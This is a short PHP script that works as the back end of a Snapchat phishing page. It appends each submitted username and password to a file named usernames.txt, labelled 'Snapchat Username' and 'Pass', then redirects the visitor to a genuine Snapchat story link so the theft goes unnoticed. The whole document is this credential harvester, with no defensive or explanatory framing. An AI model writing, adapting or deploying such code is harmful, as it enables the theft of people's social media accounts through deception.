<?php

file_put_contents("usernames.txt", "Snapchat Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://story.snapchat.com/o/W7_EDlXWTBiXAEEniNoMPwAAYY2lucmxqYWh0AYC35RjgAYC35RdTAAAAAA?share_id=QqQKiIF8J9I&locale=en-IN');
exit();
?>
